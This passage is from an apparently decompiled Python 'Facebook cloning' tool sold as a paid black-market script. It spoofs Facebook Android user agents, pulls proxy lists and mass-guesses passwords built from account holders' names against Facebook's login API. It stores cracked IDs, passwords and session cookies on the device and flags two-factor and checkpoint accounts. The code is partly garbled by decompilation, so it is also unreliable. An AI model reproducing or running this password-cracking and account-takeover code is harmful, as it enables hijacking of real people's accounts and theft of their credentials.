                    'XT2127-78',
                    'XT2127-79',
                    'XT2127-80',
                    'XT2127-81',
                    'XT2127-82',
                    'XT2127-83',
                    'XT2127-84',
                    'XT2127-85',
                    'XT2127-86',
                    'XT2127-87',
                    'XT2127-88',
                    'XT2127-89',
                    'XT2127-90',
                    'XT2127-91',
                    'XT2127-92',
                    'XT2127-93',
                    'XT2127-94',
                    'XT2127-95',
                    'XT2127-96',
                    'XT2127-97',
                    'XT2127-98',
                    'XT2127-99',
                    'XT2127-100',
                    'XT2127-101',
                    'XT2127-102',
                    'XT2127-103',
                    'XT2127-104',
                    'XT2127-105',
                    'XT2127-106',
                    'XT2127-107',
                    'XT2127-108',
                    'XT2127-109',
                    'XT2127-110',
                    'XT2127-111',
                    'XT2127-112',
                    'XT2127-113',
                    'XT2127-114',
                    'XT2127-115',
                    'XT2127-116',
                    'XT2127-117',
                    'XT2127-118',
                    'XT2127-119',
                    'XT2127-120',
                    'XT2127-121',
                    'XT2127-122',
                    'XT2127-123',
                    'XT2127-124',
                    'XT2127-125',
                    'XT2127-126',
                    'XT2127-127',
                    'XT2127-128',
                    'XT2127-129',
                    'XT2127-130',
                    'XT2127-131',
                    'XT2127-132',
                    'XT2127-133',
                    'XT2127-134',
                    'XT2127-135',
                    'XT2127-136',
                    'XT2127-137',
                    'XT2127-138',
                    'XT2127-139',
                    'XT2127-140',
                    'XT2127-141',
                    'XT2127-142',
                    'XT2127-143',
                    'XT2127-144',
                    'XT2127-145',
                    'XT2127-146',
                    'XT2127-147',
                    'XT2127-148',
                    'XT2127-149',
                    'XT2127-150',
                    'XT2127-151',
                    'XT2127-152',
                    'XT2127-153'],
                'Nokia': [
                    'TA-1208',
                    'TA-1334',
                    'TA-1336',
                    'TA-1230',
                    'TA-1239',
                    'TA-1283',
                    'TA-1335',
                    'TA-1234',
                    'TA-1347',
                    'TA-1353',
                    'TA-1340',
                    'TA-1233',
                    'TA-1338',
                    'TA-1386',
                    'TA-1307',
                    'TA-1296',
                    'TA-1281',
                    'TA-1333',
                    'TA-1244',
                    'TA-1235',
                    'TA-1357',
                    'TA-1236',
                    'TA-1339',
                    'TA-1316',
                    'TA-1329',
                    'TA-1343',
                    'TA-1354',
                    'TA-1300',
                    'TA-1303',
                    'TA-1289',
                    'TA-1315',
                    'TA-1287',
                    'TA-1342',
                    'TA-1351',
                    'TA-1331',
                    'TA-1325',
                    'TA-1295',
                    'TA-1240',
                    'TA-1286',
                    'TA-1328',
                    'TA-1284',
                    'TA-1293',
                    'TA-1341',
                    'TA-1292',
                    'TA-1327',
                    'TA-1298',
                    'TA-1323',
                    'TA-1238',
                    'TA-1291',
                    'TA-1345',
                    'TA-1309',
                    'TA-1344',
                    'TA-1324',
                    'TA-1346',
                    'TA-1326',
                    'TA-1304',
                    'TA-1320',
                    'TA-1348',
                    'TA-1318',
                    'TA-1330',
                    'TA-1280',
                    'TA-1246',
                    'TA-1248',
                    'TA-1317',
                    'TA-1299',
                    'TA-1310',
                    'TA-1350',
                    'TA-1332',
                    'TA-1242',
                    'TA-1206',
                    'TA-1294',
                    'TA-1313',
                    'TA-1249',
                    'TA-1241',
                    'TA-1216',
                    'TA-1297',
                    'TA-1285',
                    'TA-1319',
                    'TA-1243',
                    'TA-1356'],
                'Xiaomi': [
                    'M2101K7AG',
                    'M2003J15SC',
                    'M2004J19C',
                    'M2006C3LG',
                    'M2007J20CG',
                    'M2010J19CG',
                    'M2011K2C',
                    'M2012K11AG',
                    'M2101K7BG',
                    'M2101K9G',
                    'M2102J20SG',
                    'M2102K1G',
                    'M2006C3MG',
                    'M2007J20CH',
                    'M2010J19SG',
                    'M2011K2G',
                    'M2012K11C',
                    'M2101K7AI',
                    'M2101K7I',
                    'M2101K7T',
                    'M2101K7X',
                    'M2101K7Y',
                    'M2103K19G',
                    'M2104K10C',
                    'M2105K81C',
                    'M2106K10C',
                    'M2107K3AI',
                    'M2108K10C',
                    'M2109K10C',
                    'M2110K10C',
                    'M2111K10C',
                    'M2112K10C',
                    'M2113K10C',
                    'M2114K10C',
                    'M2115K10C',
                    'M2116K10C',
                    'M2117K10C',
                    'M2118K10C',
                    'M2119K10C',
                    'M2120K10C',
                    'M2121K10C',
                    'M2122K10C',
                    'M2123K10C',
                    'M2124K10C',
                    'M2125K10C',
                    'M2126K10C',
                    'M2127K10C',
                    'M2128K10C',
                    'M2129K10C',
                    'M2130K10C'],
                'Samsung': [
                    'SM-A500FU',
                    'SM-A500H',
                    'SM-G532F',
                    'SM-G900F',
                    'SM-G920F',
                    'SM-G930F',
                    'SM-G935F',
                    'SM-G950F',
                    'SM-J320F',
                    'SM-J320FN',
                    'SM-J320H',
                    'SM-J320M',
                    'SM-J510FN',
                    'SM-J701F',
                    'SM-N920S',
                    'SM-T111',
                    'SM-T230',
                    'SM-T231',
                    'SM-T235',
                    'SM-T280',
                    'SM-T311',
                    'SM-T315',
                    'SM-T525',
                    'SM-T531',
                    'SM-T535',
                    'SM-T555',
                    'SM-T561',
                    'SM-T705',
                    'SM-T805',
                    'SM-T820',
                    'SPH-L720',
                    'SM-S906E',
                    'SM-G991',
                    'SM-G981',
                    'SM-G973',
                    'SM-G960',
                    'SM-G950',
                    'SM-G930',
                    'SM-G920',
                    'SM-G900',
                    'GT-I9500',
                    'GT-I9300',
                    'GT-I9100',
                    'GT-I9000',
                    'SM-N981',
                    'SM-N970',
                    'SM-N960',
                    'SM-N950',
                    'SM-N920',
                    'SM-N910',
                    'SM-N900',
                    'GT-N7100',
                    'GT-N7000',
                    'SM-G991',
                    'SM-G981',
                    'SM-G973',
                    'SM-G960',
                    'SM-G950',
                    'SM-G930',
                    'SM-G920',
                    'SM-G900',
                    'GT-I9500',
                    'GT-I9300',
                    'GT-I9100',
                    'GT-I9000',
                    'SM-N981',
                    'SM-N970',
                    'SM-N960',
                    'SM-N950',
                    'SM-N920',
                    'SM-N910',
                    'SM-N900',
                    'GT-N7100',
                    'GT-N7000',
                    'SM-A526B',
                    'SM-A516B',
                    'SM-A516N',
                    'SM-A526U',
                    'SM-A716U',
                    'SM-A716V',
                    'SM-A5260',
                    'SM-A526W',
                    'SM-A126U',
                    'SM-A126V',
                    'SM-A016G',
                    'SM-A016B',
                    'SM-A016M',
                    'SM-A025M',
                    'SM-A025F',
                    'SM-A217F',
                    'SM-A217M',
                    'SM-A207F',
                    'SM-A207M',
                    'SM-A102U',
                    'SM-A102U1',
                    'SM-A102W',
                    'SM-A102N',
                    'SM-A1020',
                    'SM-A105F',
                    'SM-A105G',
                    'SM-A105M',
                    'SM-A202F',
                    'SM-A202G',
                    'SM-A202M',
                    'SM-A125U',
                    'SM-A125V',
                    'SM-A022G',
                    'SM-A022M',
                    'SM-A027G',
                    'SM-A027M',
                    'SM-A2170',
                    'SM-A115M',
                    'SM-A107M',
                    'SM-A107F',
                    'SM-A107M',
                    'SM-A0220',
                    'SM-A115F',
                    'SM-A102F',
                    'SM-A1050'],
                'Vivo': [
                    'V2056',
                    'V2112A',
                    'V2112',
                    'V2122A',
                    'V2120A',
                    'V2120',
                    'V2116A',
                    'V2114A',
                    'V2112A',
                    'V2010A',
                    'V2019A',
                    'V2010',
                    'V2003A',
                    'V2002A',
                    'V2002',
                    'V1932A',
                    'V1932T',
                    'V1932',
                    'V1929A',
                    'V1928A',
                    'V1928T',
                    'V1928',
                    'V1927A',
                    'V1926A',
                    'V1925A',
                    'V1925',
                    'V1924A',
                    'V1922A',
                    'V1921A',
                    'V1921',
                    'V1920A',
                    'V1919A',
                    'V1916A',
                    'V1916',
                    'V1912A',
                    'V1911A',
                    'V1910A',
                    'V1910',
                    'V1909A',
                    'V1907A',
                    'V1905',
                    'V1903A',
                    'V1901A',
                    'V1901T',
                    'V1901',
                    'V1836',
                    'V1824A',
                    'V1824T',
                    'V1824',
                    'V1818A',
                    'V1818T',
                    'V1813A',
                    'V1813T',
                    'V1813',
                    'V1812A',
                    'V1811A',
                    'V1811T',
                    'V1811',
                    'V1808A',
                    'V1808T',
                    'V1808',
                    'V1801A',
                    'V1801T',
                    'V1801',
                    'V1730T',
                    'V1730F',
                    'V1730A',
                    'V1730',
                    'V1724A',
                    'V1723A',
                    'V1723',
                    'V1721A',
                    'V1720A',
                    'V1720T',
                    'V1720',
                    'V1716A',
                    'V1715A',
                    'V1715',
                    'V1713A',
                    'V1713',
                    'V1712A',
                    'V1712',
                    'V1711T',
                    'V1711A',
                    'V1711',
                    'V1709A',
                    'V1709T',
                    'V1709',
                    'V1708A',
                    'V1708T',
                    'V1707A',
                    'V1707T',
                    'V1706T',
                    'V1706',
                    'V1703A',
                    'V1701A',
                    'V1701',
                    'V1624A',
                    'V1623A',
                    'V1622A',
                    'V1622',
                    'V1621A',
                    'V1619',
                    'V1618A',
                    'V1617A',
                    'V1616',
                    'V1615T',
                    'V1614T',
                    'V1613',
                    'V1611T',
                    'V1611',
                    'V1608A',
                    'V1609',
                    'V1605',
                    'V1604',
                    'V1603',
                    'V1601',
                    'V1570',
                    'V1562',
                    'V1561',
                    'V1550',
                    'V1548',
                    'V1546',
                    'V1543',
                    'V1542',
                    'V1540',
                    'V1530',
                    'V1520',
                    'V1510',
                    'V1500',
                    'V1420',
                    'V1400',
                    'V1310',
                    'V1320'] }
            fbcr1 = random.choice(fbcr_values)
            fbcr2 = random.choice(fbcr_values)
            fbcr3 = random.choice(fbcr_values)
            fbcr4 = random.choice(fbcr_values)
            fbcr5 = random.choice(fbcr_values)
            fbcr6 = random.choice(fbcr_values)
            fbcr7 = random.choice(fbcr_values)
            fbcr8 = random.choice(fbcr_values)
            fbcr9 = random.choice(fbcr_values)
            fbcr10 = random.choice(fbcr_values)
            fbmf1 = random.choice(list(fbmf_fbdv_dict.keys()))
            fbmf2 = random.choice(list(fbmf_fbdv_dict.keys()))
            fbmf3 = random.choice(list(fbmf_fbdv_dict.keys()))
            fbmf4 = random.choice(list(fbmf_fbdv_dict.keys()))
            fbmf5 = random.choice(list(fbmf_fbdv_dict.keys()))
            fbmf6 = random.choice(list(fbmf_fbdv_dict.keys()))
            fbmf7 = random.choice(list(fbmf_fbdv_dict.keys()))
            fbmf8 = random.choice(list(fbmf_fbdv_dict.keys()))
            fbmf9 = random.choice(list(fbmf_fbdv_dict.keys()))
            fbmf10 = random.choice(list(fbmf_fbdv_dict.keys()))
            fbdv1 = random.choice(fbmf_fbdv_dict[fbmf1])
            fbdv2 = random.choice(fbmf_fbdv_dict[fbmf2])
            fbdv3 = random.choice(fbmf_fbdv_dict[fbmf3])
            fbdv4 = random.choice(fbmf_fbdv_dict[fbmf4])
            fbdv5 = random.choice(fbmf_fbdv_dict[fbmf5])
            fbdv6 = random.choice(fbmf_fbdv_dict[fbmf6])
            fbdv7 = random.choice(fbmf_fbdv_dict[fbmf7])
            fbdv8 = random.choice(fbmf_fbdv_dict[fbmf8])
            fbdv9 = random.choice(fbmf_fbdv_dict[fbmf9])
            fbdv10 = random.choice(fbmf_fbdv_dict[fbmf10])
            dalvik = []
            for alex in range(5000):
                ua1 = 'Dalvik/2.1.0 (Linux; U; Android '
                ua2 = random.choice([
                    '7',
                    '8',
                    '9',
                    '10',
                    '11',
                    '12',
                    '13'])
                if ua2 == '7':
                    ua6 = random.choice([
                        'NRD90M',
                        'NMF26X',
                        'NRD90U']) + ')'
                if ua2 == '8':
                    ua6 = random.choice([
                        'R16NW',
                        'O11019']) + ')'
                if ua2 == '9':
                    ua6 = f'''PPR1.{random.randint(100000, 200000)}.0{random.randint(10, 25)}''' + ')'
                if ua2 == '10':
                    ua6 = f'''QP1A.{random.randint(100000, 200000)}.0{random.randint(10, 25)}''' + ')'
                if ua2 == '11':
                    ua6 = f'''RP1A.{random.randint(100000, 200000)}.0{random.randint(10, 25)}''' + ')'
                if ua2 == '12':
                    ua6 = f'''SP1A.{random.randint(100000, 200000)}.0{random.randint(10, 25)}''' + ')'
                if ua2 == '13':
                    ua6 = f'''TP1A.{random.randint(100000, 200000)}.0{random.randint(10, 25)}''' + ')'
                ua8 = random.choice([
                    fbcr1,
                    fbcr2,
                    fbcr3,
                    fbcr4,
                    fbcr5])
                ua4 = random.choice([
                    fbmf1,
                    fbmf2,
                    fbmf3,
                    fbmf4,
                    fbmf5])
                if ua4 == fbmf1:
                    ua5 = fbdv1
                if ua4 == fbmf2:
                    ua5 = fbdv2
                if ua4 == fbmf3:
                    ua5 = fbdv3
                if ua4 == fbmf4:
                    ua5 = fbdv4
                if ua4 == fbmf5:
                    ua5 = fbdv5
                ua7 = ' [FBAN/Orca-Android;FBAV/' + str(random.randint(199, 399)) + '.0.0.' + str(random.randint(1, 9)) + '.' + str(random.randint(99, 199)) + ';FBPN/com.facebook.orca;FBLC/en_US;FBBV/' + str(random.randint(111111111, 999999999)) + ';FBCR/' + ua8 + ';FBMF/' + ua4 + ';FBBD/' + ua4 + ';FBDV/' + ua5 + ';FBSV/' + str(random.randint(9, 12)) + ';FBCA/arm64-v8a:null;FBDM/{density=' + str(random.randint(2, 3)) + '.' + str(random.randint(0, 5)) + ',width=720,height=' + str(random.randint(1400, 1499)) + '};]'
                orca1 = ' [FBAN/Orca-Android;FBAV/' + str(random.randint(199, 399)) + '.0.0.' + str(random.randint(1, 9)) + '.' + str(random.randint(99, 199)) + ';FBPN/com.facebook.orca;FBLC/'
                orca2 = 'en_US'
                orca3 = ';FBBV/' + str(random.randint(111111111, 999999999)) + ';FBCR/'
                orca4 = random.choice([
                    'GLOBE',
                    'TNT',
                    'SMART',
                    'TM',
                    'DITO'])
                orca5 = ';FBMF/'
                orca6 = ua4
                orca7 = ';FBBD/'
                orca11 = ';FBDV/'
                orca8 = ua4
                orca9 = ua5
                orca10 = ';FBSV/' + str(random.randint(9, 12)) + ';FBCA/arm64-v8a:null;FBDM/{density=' + str(random.randint(2, 3)) + '.' + str(random.randint(0, 5)) + ',width=720,height=' + str(random.randint(1400, 1499)) + '};FB_FW/1;]'
                ua3 = f'''; {ua4} {ua5} Build/'''
                result = f'''{ua1}{ua2}{ua3}{ua6}{orca1}{orca2}{orca3}{orca4}{orca5}{orca6}{orca7}{orca6}{orca11}{orca8} {orca9}{orca10}'''
                dalvik.append(result)
                prox = requests.get('https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=socks5&proxy_format=ipport&format=text&timeout=20000').text
                open('.prox.txt', 'w').write(prox)
                [][f'''{a1}'''][f'''{a2}'''][f'''{a3}'''][f'''{a4}'''][f'''{a5}'''][f'''{a6}'''][f'''{a7}'''][f'''{a8}'''][f'''{a9}'''][f'''{a10}'''][f'''{a11}'''][f'''{a12}'''][' '][f'''{katana1}'''][f'''{katana2}'''][f'''{katana3}'''][f'''{katana4}'''][f'''{katana5}'''][f'''{katana6}'''][f'''{katana7}'''][f'''{katana8}'''][f'''{katana9}'''][f'''{katana10}'''][f'''{katana11}'''][f'''{katana12}'''][' '][f'''{mess1}'''][f'''{mess2}'''][f'''{mess3}'''][f'''{mess4}'''][f'''{mess5}'''][f'''{mess6}'''][f'''{mess7}'''][f'''{mess8}'''][f'''{mess9}''']
                print('Internet Error')
                sys.exit()
                xvx = open('.prox.txt', 'r').read().splitlines()
                logo = '\x1b[1;32m\n\n                 █████╗ ██╗  ██╗██╗     \n                ██╔══██╗╚██╗██╔╝██║     \n                ███████║ ╚███╔╝ ██║     \n                ██╔══██║ ██╔██╗ ██║     \n                ██║  ██║██╔╝ ██╗███████╗\n                ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝\n\x1b[1;32m ─────────────────────────────────────────────────────── \n  Owner      :  Alexander Grayson\n  Facebook   :  AlexanderGraysonRecovery.IAmLimitless\n  Tool Type  :  RPW Facebook Cloning Tool (Paid)\n  Network    :  All Network\n  Version    :  1.4\n\x1b[1;32m ───────────────────────────────────────────────────────'
                
                def linex():
                    print('\x1b[1;32m ───────────────────────────────────────────────────────')

                
                def clear():
                    os.system('clear')
                    print(logo)

                user_opt = []
                loop = 0
                oks = []
                cps = []
                twf = []
                pcp = []
                id = []
                tokenku = []
                
                def menu():
                    clear()
                    print(' [1] File Cloning')
                    linex()
                    xd = input(' Choose an option: ')
                    if xd in ('1', '01'):
                        clear()
                        print(' Put file example:  /sdcard/File.txt  ')
                        linex()
                        file = input(' Put file path:\x1b[1; \x1b[92;1m ')
                        fo = open(file, 'r').read().splitlines()
                        if FileNotFoundError:
                            print(' File location not found ')
                            time.sleep(1)
                            menu()
                        clear()
                        print(' [1] Method 1')
                        print(' [2] Method 2')
                        print(' [3] Method 3 (Method 3 in Noload)')
                        print(' [4] Method 4 (Method 2 in Noload)')
                        print(' [5] Method 5')
                        linex()
                        mthd = input(' Choose: ')
                        linex()
                        plist = []
                        print(' Select Password Crack Menu:')
                        linex()
                        print(' [0] Crack with Automatic Password (17 pass) \n [1] Crack with Automatic Password (35+ pass)\n [2] Crack with Password Choice \n [3] Working Passwords for Cloning ')
                        linex()
                        ppp = input('\x1b[1;32m Choose: ')
                        if ppp in ('0', '00'):
                            plist.append('First123')
                            plist.append('First12345')
                            plist.append('Firstlast123')
                            plist.append('Firstlast12345')
                            plist.append('First')
                            plist.append('first')
                            plist.append('first123')
                            plist.append('first1234')
                            plist.append('first12345')
                            plist.append('first143')
                            plist.append('firstlast')
                            plist.append('firstlast123')
                            plist.append('firstlast12345')
                            plist.append('last123')
                            plist.append('last12345')
                            plist.append('lastfirst123')
                            plist.append('lastfirst12345')
                        if ppp in ('1', '01'):
                            plist.append('first last')
                            plist.append('firstlast')
                            plist.append('first')
                            plist.append('last')
                            plist.append('first123')
                            plist.append('first1234')
                            plist.append('first12345')
                            plist.append('first143')
                            plist.append('last123')
                            plist.append('last1234')
                            plist.append('last12345')
                            plist.append('last143')
                            plist.append('lastfirst')
                            plist.append('last first')
                            plist.append('firstlast123')
                            plist.append('lastfirst123')
                            plist.append('firstlast143')
                            plist.append('lastfirst143')
                            plist.append('first last123')
                            plist.append('last first123')
                            plist.append('first last143')
                            plist.append('last first143')
                            plist.append('firstmaganda')
                            plist.append('firstpogi')
                            plist.append('lastmaganda')
                            plist.append('lastpogi')
                            plist.append('firstcute')
                            plist.append('lastcute')
                            plist.append('first2022')
                            plist.append('first2023')
                            plist.append('iloveyou')
                            plist.append('i love you')
                            plist.append('jesus123')
                            plist.append('jesus143')
                            plist.append('god123')
                            plist.append('god143')
                        if ppp in ('3', '03'):
                            clear()
                            print(' \x1b[1;32mWorking password for Philippines\x1b[1;37m ')
                            linex()
                            print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first12345\n [5] first123\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
                            linex()
                            input(' Press enter to back menu ')
                            menu()
                        linex()
                        ps_limit = int(input(' How many passwords do you want to add? '))
                        ps_limit = 1
                        linex()
                        print('\x1b[1;32m example: first last,firtslast,first123')
                        linex()
                        for i in range(ps_limit):
                            plist.append(input(f'''\x1b[1;32m Put password {i + 1}: '''))
                            linex()
                            print(' Do you want to show cp accounts? (y/n): ')
                            linex()
                            cx = input('\x1b[1;32m Choose: ')
                            if cx in ('y', 'Y', 'yes', 'Yes', '1'):
                                pcp.append('y')
                        pcp.append('n')
                        crack_submit = tred(max_workers = 20)
                        clear()
                        total_ids = str(len(fo))
                        print(' [•] Total accounts : \x1b[1;32m' + total_ids + f''' \x1b[1;33m---\x1b[1;33m> \x1b[1;37mMethod Number :\x1b[1;37m {mthd}''')
                        print('\x1b[1;37m \x1b[38;5; \x1b[92;1m[•] Use airplane mode every 200 counts.\x1b[1;37m')
                        linex()
                        for user in fo:
                            (ids, names) = user.split('|')
                            passlist = plist
                            if mthd in ('1', '01'):
                                crack_submit.submit(ffb5, ids, names, passlist)
                            if mthd in ('2', '02'):
                                crack_submit.submit(ffb4, ids, names, passlist)
                            if mthd in ('3', '03'):
                                crack_submit.submit(ffb22, ids, names, passlist)
                            if mthd in ('4', '04'):
                                crack_submit.submit(ffb00, ids, names, passlist)
                            if mthd in ('5', '05'):
                                crack_submit.submit(ffb6, ids, names, passlist)
                            None(None, None)
                            if not None:
                                pass
                        print('\x1b[1;37m')
                        linex()
                        print(' The process has completed')
                        print(' Total OK/CP/2F: ' + str(len(oks)) + '/' + str(len(cps)) + '/' + str(len(twf)))
                        linex()
                        input(' Press enter to go back ')
                        os.system('python axl_scriptforsale.py')
                        return None

                
                def Subscription():
                    key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
                    clear()
                    print(logo)
                    r1 = str(urlopen('https://github.com/RPW-ALEX1107GRAY/approvalSheet/blob/main/approvalSheet.txt').read())
                    if key1 in r1:
                        os.system('clear')
                        print(logo)
                        return None
                    None.system('clear')
                    print(logo)
                    print('\t \x1b[1;32m Please Get Approval First\x1b[1;37m ')
                    time.sleep(1)
                    os.system('clear')
                    print(logo)
                    print('')
                    print(" \x1b[1;32m Alexander Grayson's RPW Cloning Tool [Black Market] \x1b[1;37m\n")
                    print(' \x1b[1;32m Note : THIS IS A PAID TOOL!   \x1b[1;37m')
                    print('')
                    print('  [ Mode of Payment : GCASH ] ')
                    print('')
                    print('  Your key is not Approved. ')
                    print('')
                    print('  Copy and Send Key To Alexander Grayson')
                    print('')
                    print('  Your Key : ' + ah + key1)
                    print('')
                    name = input('  Your Name : ')
                    print('')
                    lol = input('  Your Email : ')
                    print('')
                    input('  Press Enter To Send Key')
                    time.sleep(3.5)
                    os.system('am start https://m.me/AlexanderGraysonRecovery.IAmLimitless')
                    Subscription()

                Subscription()
                
                def ffb6(ids, names, passlist):
                    global loop
                    sys.stdout.write('\r\r\x1b[1;37m [ALEX-CRACKING]  %s | ALIVE: %s\x1b[1;37m' % (loop, len(oks)))
                    sys.stdout.flush()
                    fn = names.split(' ')[0]
                    ln = names.split(' ')[1]
                    ln = fn
                    for pw in passlist:
                        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
                        fbbv = str(random.randint(0, 999999999))
                        tokenlist = [
                            '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                            '256002347743983|374e60f8b9bb6b8cbb30f78030438895']
                        accessToken = random.choice(tokenlist)
                        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
                        fbbv = str(random.randint(111111111, 999999999))
                        fblc = 'zh_HK'
                        fbfw = '1'
                        fbrv = '0'
                        if '350685531728' in accessToken:
                            fbpn = 'com.facebook.katana'
                            fban = 'FB4A'
                        fbpn = 'com.facebook.orca'
                        fban = 'Orca-Android'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
                        sim_serials = f'''["{xd}"]'''
                        li = [
                            '28',
                            '29',
                            '210']
                        li2 = random.choice(li)
                        j1 = (lambda .0: for _ in .0:
random.choice(digits)None)(range(2)())
                        jazoest = li2 + j1
                        ua_bgraph2 = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';' + '[FBAN/FB4A;FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=2.0,width=720,height=1436};FBLC/en_Qaag_US;FBRV/359080319;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1808;FBSV/8.1.0;nullFBCA/armeabi-v7a:armeabi;]'
                        data = {
                            'api_key': '882a8490361da98702bf97a021ddc14d',
                            'fb_api_req_friendly_name': 'authenticate',
                            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
                        head = {
                            'x-fb-http-engine': 'Liger' }
                        url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
                        po = requests.post(url, data = data, headers = head).json()
                        if 'session_key' in po:
                            cookie = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
                            print('\r\r\x1b[1;32m [ALEX-ALIVE] ' + ids + ' | ' + pas + ' | [' + alex(ids) + ']\x1b[1;97m')
                            if ids[:4] in ('1000',):
                                open('/sdcard/ALEX-OK-OLD.txt', 'a').write(ids + '|' + pas + '\n')
                                open('/sdcard/ALEX-ALIVE-OLD.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            if ids[:4] in ('6155',):
                                open('/sdcard/ALEX-OK-NEW.txt', 'a').write(ids + '|' + pas + '\n')
                                open('/sdcard/ALEX-ALIVE-NEW.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            open('/sdcard/ALEX-ALIVE.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                            open('/sdcard/ALEX-OK.txt', 'a').write(ids + '|' + pas + '\n')
                            oks.append(ids)
                            ';'.join
                        if twf in str(po):
                            if 'y' in pcp:
                                print('\r\r\x1b[1;93m [TWO-FACTOR] ' + ids + ' | ' + pas + ' | [' + alex(ids) + ']\x1b[1;97m')
                                twf.append(ids)
                                'gzip, deflate'
                        if 'www.facebook.com' in po['error']['message']:
                            if 'y' in pcp:
                                print('\r\r\x1b[1;93m [CHECKPOINT] ' + ids + ' | ' + pas + ' | [' + alex(ids) + ']\x1b[1;97m')
                                open('/sdcard/ALEX-CP.txt', 'a').write(ids + '|' + pas + '\n')
                                'accept-encoding'
                            open('/sdcard/ALEX-CP.txt', 'a').write(ids + '|' + pas + '\n')
                            'graphservice'
                        loop += 1
                        return None
                        if Exception:
                            e = 'X-FB-Request-Analytics-Tags'
                            e = None
                            del e
                            return None
                        e = 'X-FB-Request-Analytics-Tags'
                        del e

                
                def ffb5(ids, names, passlist):
                    global loop
                    sys.stdout.write('\r\r\x1b[1;37m [ALEX-CRACKING]  %s | ALIVE: %s\x1b[1;37m' % (loop, len(oks)))
                    sys.stdout.flush()
                    fn = names.split(' ')[0]
                    ln = names.split(' ')[1]
                    ln = fn
                    for pw in passlist:
                        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
                        fbbv = str(random.randint(0, 999999999))
                        tokenlist = [
                            '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                            '256002347743983|374e60f8b9bb6b8cbb30f78030438895']
                        accessToken = random.choice(tokenlist)
                        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
                        fbbv = str(random.randint(111111111, 999999999))
                        fblc = 'zh_HK'
                        fbfw = '1'
                        fbrv = '0'
                        if '350685531728' in accessToken:
                            fbpn = 'com.facebook.katana'
                            fban = 'FB4A'
                        fbpn = 'com.facebook.orca'
                        fban = 'Orca-Android'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
                        sim_serials = f'''["{xd}"]'''
                        li = [
                            '28',
                            '29',
                            '210']
                        li2 = random.choice(li)
                        j1 = (lambda .0: for _ in .0:
random.choice(digits)None)(range(2)())
                        jazoest = li2 + j1
                        ua_bgraph = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';' + '[FBAN/FB4A;FBAV/' + fbav + ';FBPN/com.facebook.katana;FBLC/pt_BR;FBBV/' + fbbv + ';FBCR/CLARO BR;FBMF/Xiaomi;FBBD/Redmi;FBDV/M1908C3JGG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2216};FB_FW/1;FBRV/470765339;] FBBK/1' + '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';' + '[FBAN/FB4A;FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=2.75,width=1080,height=2134};FBLC/ar_AR;FBRV/' + fbrv + ';FBCR/etisalat by e&amp-;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8' + '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';' + '[FBAN/Orca-Android;FBAV/' + fbav + ';FBPN/com.facebook.orca;FBLC/in_ID;FBBV/' + fbbv + ';FBCR/Telkomsel;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/RNE-L22;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2050};FB_FW/1;]'
                        data = {
                            'locale': 'en_SV',
                            'client_country_code': 'SV',
                            'fb_api_req_friendly_name': 'authenticate',
                            'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
                        head = {
                            'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
